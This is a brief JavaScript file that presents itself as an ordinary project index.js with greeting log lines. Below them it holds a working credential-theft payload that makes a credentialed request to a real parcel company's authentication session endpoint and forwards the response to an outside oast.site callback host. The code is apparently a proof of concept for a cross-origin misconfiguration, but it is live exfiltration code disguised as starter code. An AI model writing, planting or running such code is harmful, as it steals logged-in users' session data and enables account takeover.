console.log('Hello, World!');
console.log('This is the index.js file.');
console.log('Welcome to the project!');


var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://apis.consumers.dpd.co.uk/auth/session',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/log?key='+this.responseText; 
};